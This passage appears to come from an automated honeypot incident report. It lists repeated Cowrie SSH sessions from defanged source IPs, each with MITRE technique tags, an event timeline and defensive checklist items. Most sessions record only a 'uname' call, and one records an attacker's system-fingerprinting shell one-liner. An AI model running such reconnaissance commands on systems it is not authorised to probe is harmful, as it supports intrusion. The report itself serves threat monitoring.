| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:57:08` | `cowrie.session.connect` |
| `2026-09-05 17:57:08` | `cowrie.client.version` |
| `2026-09-05 17:57:08` | `cowrie.client.kex` |
| `2026-09-05 17:57:08` | `cowrie.login.success` |
| `2026-09-05 17:57:08` | `cowrie.session.params` |
| `2026-09-05 17:57:08` | `cowrie.command.input` |
| `2026-09-05 17:57:08` | `cowrie.log.closed` |
| `2026-09-05 17:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42021aa87d02

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:57 |
| **Last Seen** | 2026-09-05 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:57:22` | `cowrie.session.connect` |
| `2026-09-05 17:57:22` | `cowrie.client.version` |
| `2026-09-05 17:57:22` | `cowrie.client.kex` |
| `2026-09-05 17:57:22` | `cowrie.login.success` |
| `2026-09-05 17:57:23` | `cowrie.session.params` |
| `2026-09-05 17:57:23` | `cowrie.command.input` |
| `2026-09-05 17:57:23` | `cowrie.log.closed` |
| `2026-09-05 17:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561bad23b328

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:57 |
| **Last Seen** | 2026-09-05 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:57:37` | `cowrie.session.connect` |
| `2026-09-05 17:57:37` | `cowrie.client.version` |
| `2026-09-05 17:57:37` | `cowrie.client.kex` |
| `2026-09-05 17:57:37` | `cowrie.login.success` |
| `2026-09-05 17:57:37` | `cowrie.session.params` |
| `2026-09-05 17:57:37` | `cowrie.command.input` |
| `2026-09-05 17:57:37` | `cowrie.log.closed` |
| `2026-09-05 17:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f61922a8aa

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:57 |
| **Last Seen** | 2026-09-05 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:57:51` | `cowrie.session.connect` |
| `2026-09-05 17:57:51` | `cowrie.client.version` |
| `2026-09-05 17:57:51` | `cowrie.client.kex` |
| `2026-09-05 17:57:51` | `cowrie.login.success` |
| `2026-09-05 17:57:51` | `cowrie.session.params` |
| `2026-09-05 17:57:51` | `cowrie.command.input` |
| `2026-09-05 17:57:51` | `cowrie.log.closed` |
| `2026-09-05 17:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffbd310be245

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:58 |
| **Last Seen** | 2026-09-05 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:58:05` | `cowrie.session.connect` |
| `2026-09-05 17:58:05` | `cowrie.client.version` |
| `2026-09-05 17:58:05` | `cowrie.client.kex` |
| `2026-09-05 17:58:05` | `cowrie.login.success` |
| `2026-09-05 17:58:06` | `cowrie.session.params` |
| `2026-09-05 17:58:06` | `cowrie.command.input` |
| `2026-09-05 17:58:06` | `cowrie.log.closed` |
| `2026-09-05 17:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b851189614b1

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:58 |
| **Last Seen** | 2026-09-05 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:58:20` | `cowrie.session.connect` |
| `2026-09-05 17:58:20` | `cowrie.client.version` |
| `2026-09-05 17:58:20` | `cowrie.client.kex` |
| `2026-09-05 17:58:20` | `cowrie.login.success` |
| `2026-09-05 17:58:20` | `cowrie.session.params` |
| `2026-09-05 17:58:20` | `cowrie.command.input` |
| `2026-09-05 17:58:20` | `cowrie.log.closed` |
| `2026-09-05 17:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e845b275a5a6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:58 |
| **Last Seen** | 2026-09-05 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:58:34` | `cowrie.session.connect` |
| `2026-09-05 17:58:34` | `cowrie.client.version` |
| `2026-09-05 17:58:34` | `cowrie.client.kex` |
| `2026-09-05 17:58:34` | `cowrie.login.success` |
| `2026-09-05 17:58:35` | `cowrie.session.params` |
| `2026-09-05 17:58:35` | `cowrie.command.input` |
| `2026-09-05 17:58:35` | `cowrie.log.closed` |
| `2026-09-05 17:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99cda0a24aa

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:58 |
| **Last Seen** | 2026-09-05 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:58:49` | `cowrie.session.connect` |
| `2026-09-05 17:58:49` | `cowrie.client.version` |
| `2026-09-05 17:58:49` | `cowrie.client.kex` |
| `2026-09-05 17:58:49` | `cowrie.login.success` |
| `2026-09-05 17:58:50` | `cowrie.session.params` |
| `2026-09-05 17:58:50` | `cowrie.command.input` |
| `2026-09-05 17:58:50` | `cowrie.log.closed` |
| `2026-09-05 17:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2371e66dfc3f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:58 |
| **Last Seen** | 2026-09-05 17:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:58:58` | `cowrie.session.connect` |
| `2026-09-05 17:58:59` | `cowrie.client.version` |
| `2026-09-05 17:58:59` | `cowrie.client.kex` |
| `2026-09-05 17:59:03` | `cowrie.login.success` |
| `2026-09-05 17:59:06` | `cowrie.session.params` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.success` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:06` | `cowrie.command.input` |
| `2026-09-05 17:59:07` | `cowrie.log.closed` |
| `2026-09-05 17:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b717df0c8f8

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:59 |
| **Last Seen** | 2026-09-05 17:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:59:03` | `cowrie.session.connect` |
| `2026-09-05 17:59:03` | `cowrie.client.version` |
| `2026-09-05 17:59:03` | `cowrie.client.kex` |
| `2026-09-05 17:59:03` | `cowrie.login.success` |
| `2026-09-05 17:59:04` | `cowrie.session.params` |
| `2026-09-05 17:59:04` | `cowrie.command.input` |
| `2026-09-05 17:59:04` | `cowrie.log.closed` |
| `2026-09-05 17:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d0ac71bfae

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:59 |
| **Last Seen** | 2026-09-05 17:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:59:18` | `cowrie.session.connect` |
| `2026-09-05 17:59:18` | `cowrie.client.version` |
| `2026-09-05 17:59:18` | `cowrie.client.kex` |
| `2026-09-05 17:59:18` | `cowrie.login.success` |
| `2026-09-05 17:59:19` | `cowrie.session.params` |
| `2026-09-05 17:59:19` | `cowrie.command.input` |
| `2026-09-05 17:59:19` | `cowrie.log.closed` |
| `2026-09-05 17:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f24ce1fbdd

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:59 |
| **Last Seen** | 2026-09-05 17:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:59:33` | `cowrie.session.connect` |
| `2026-09-05 17:59:33` | `cowrie.client.version` |
| `2026-09-05 17:59:33` | `cowrie.client.kex` |
| `2026-09-05 17:59:33` | `cowrie.login.success` |
| `2026-09-05 17:59:33` | `cowrie.session.params` |
| `2026-09-05 17:59:33` | `cowrie.command.input` |
| `2026-09-05 17:59:33` | `cowrie.log.closed` |
| `2026-09-05 17:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31af2e7427e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:59 |
| **Last Seen** | 2026-09-05 17:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:59:48` | `cowrie.session.connect` |
| `2026-09-05 17:59:48` | `cowrie.client.version` |
| `2026-09-05 17:59:48` | `cowrie.client.kex` |
| `2026-09-05 17:59:48` | `cowrie.login.success` |
| `2026-09-05 17:59:49` | `cowrie.session.params` |
| `2026-09-05 17:59:49` | `cowrie.command.input` |
| `2026-09-05 17:59:49` | `cowrie.log.closed` |
| `2026-09-05 17:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d641b39cbb1

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:00 |
| **Last Seen** | 2026-09-05 18:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:00:03` | `cowrie.session.connect` |
| `2026-09-05 18:00:03` | `cowrie.client.version` |
| `2026-09-05 18:00:03` | `cowrie.client.kex` |
| `2026-09-05 18:00:03` | `cowrie.login.success` |
| `2026-09-05 18:00:04` | `cowrie.session.params` |
| `2026-09-05 18:00:04` | `cowrie.command.input` |
| `2026-09-05 18:00:04` | `cowrie.log.closed` |
| `2026-09-05 18:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f193e51549

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:00 |
| **Last Seen** | 2026-09-05 18:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:00:19` | `cowrie.session.connect` |
| `2026-09-05 18:00:19` | `cowrie.client.version` |
| `2026-09-05 18:00:19` | `cowrie.client.kex` |
| `2026-09-05 18:00:19` | `cowrie.login.success` |
| `2026-09-05 18:00:19` | `cowrie.session.params` |
| `2026-09-05 18:00:19` | `cowrie.command.input` |
| `2026-09-05 18:00:19` | `cowrie.log.closed` |
| `2026-09-05 18:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1c5f4bb516

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:00 |
| **Last Seen** | 2026-09-05 18:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:00:34` | `cowrie.session.connect` |
| `2026-09-05 18:00:34` | `cowrie.client.version` |
| `2026-09-05 18:00:34` | `cowrie.client.kex` |
| `2026-09-05 18:00:34` | `cowrie.login.success` |
| `2026-09-05 18:00:34` | `cowrie.session.params` |
| `2026-09-05 18:00:34` | `cowrie.command.input` |
| `2026-09-05 18:00:34` | `cowrie.log.closed` |
| `2026-09-05 18:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85eebe0137e3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:00 |
| **Last Seen** | 2026-09-05 18:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:00:49` | `cowrie.session.connect` |
| `2026-09-05 18:00:49` | `cowrie.client.version` |
| `2026-09-05 18:00:49` | `cowrie.client.kex` |
| `2026-09-05 18:00:49` | `cowrie.login.success` |
| `2026-09-05 18:00:49` | `cowrie.session.params` |
| `2026-09-05 18:00:49` | `cowrie.command.input` |
| `2026-09-05 18:00:49` | `cowrie.log.closed` |
| `2026-09-05 18:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b34f968d4a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:01 |
| **Last Seen** | 2026-09-05 18:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:01:03` | `cowrie.session.connect` |
| `2026-09-05 18:01:03` | `cowrie.client.version` |
| `2026-09-05 18:01:03` | `cowrie.client.kex` |
| `2026-09-05 18:01:03` | `cowrie.login.success` |
| `2026-09-05 18:01:04` | `cowrie.session.params` |
| `2026-09-05 18:01:04` | `cowrie.command.input` |
| `2026-09-05 18:01:04` | `cowrie.log.closed` |
| `2026-09-05 18:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51fcdd65040e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:01 |
| **Last Seen** | 2026-09-05 18:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:01:18` | `cowrie.session.connect` |
| `2026-09-05 18:01:18` | `cowrie.client.version` |
| `2026-09-05 18:01:18` | `cowrie.client.kex` |
| `2026-09-05 18:01:19` | `cowrie.login.success` |
| `2026-09-05 18:01:19` | `cowrie.session.params` |
| `2026-09-05 18:01:19` | `cowrie.command.input` |
| `2026-09-05 18:01:19` | `cowrie.log.closed` |
| `2026-09-05 18:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0327ab07b66c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:01 |
| **Last Seen** | 2026-09-05 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:01:34` | `cowrie.session.connect` |
| `2026-09-05 18:01:34` | `cowrie.client.version` |
| `2026-09-05 18:01:34` | `cowrie.client.kex` |
| `2026-09-05 18:01:35` | `cowrie.login.success` |
| `2026-09-05 18:01:35` | `cowrie.session.params` |
| `2026-09-05 18:01:35` | `cowrie.command.input` |
| `2026-09-05 18:01:35` | `cowrie.log.closed` |
| `2026-09-05 18:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45e4c084134

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:01 |
| **Last Seen** | 2026-09-05 18:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:01:48` | `cowrie.session.connect` |
| `2026-09-05 18:01:48` | `cowrie.client.version` |
| `2026-09-05 18:01:48` | `cowrie.client.kex` |
| `2026-09-05 18:01:48` | `cowrie.login.success` |
| `2026-09-05 18:01:49` | `cowrie.session.params` |
| `2026-09-05 18:01:49` | `cowrie.command.input` |
| `2026-09-05 18:01:49` | `cowrie.log.closed` |
| `2026-09-05 18:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c100a8aaca7c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:02 |
| **Last Seen** | 2026-09-05 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:02:02` | `cowrie.session.connect` |
| `2026-09-05 18:02:02` | `cowrie.client.version` |
| `2026-09-05 18:02:02` | `cowrie.client.kex` |
| `2026-09-05 18:02:02` | `cowrie.login.success` |
| `2026-09-05 18:02:03` | `cowrie.session.params` |
| `2026-09-05 18:02:03` | `cowrie.command.input` |
| `2026-09-05 18:02:03` | `cowrie.log.closed` |
| `2026-09-05 18:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791d417a07fc

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:02 |
| **Last Seen** | 2026-09-05 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:02:17` | `cowrie.session.connect` |
| `2026-09-05 18:02:17` | `cowrie.client.version` |
| `2026-09-05 18:02:17` | `cowrie.client.kex` |
| `2026-09-05 18:02:17` | `cowrie.login.success` |
| `2026-09-05 18:02:18` | `cowrie.session.params` |
| `2026-09-05 18:02:18` | `cowrie.command.input` |
| `2026-09-05 18:02:18` | `cowrie.log.closed` |
| `2026-09-05 18:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0360d40aa7fd

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:02 |
| **Last Seen** | 2026-09-05 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:02:32` | `cowrie.session.connect` |
| `2026-09-05 18:02:32` | `cowrie.client.version` |
| `2026-09-05 18:02:32` | `cowrie.client.kex` |
| `2026-09-05 18:02:32` | `cowrie.login.success` |
| `2026-09-05 18:02:32` | `cowrie.session.params` |
| `2026-09-05 18:02:32` | `cowrie.command.input` |
| `2026-09-05 18:02:32` | `cowrie.log.closed` |
| `2026-09-05 18:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec3de09d533

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:02 |
| **Last Seen** | 2026-09-05 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:02:46` | `cowrie.session.connect` |
| `2026-09-05 18:02:46` | `cowrie.client.version` |
| `2026-09-05 18:02:46` | `cowrie.client.kex` |
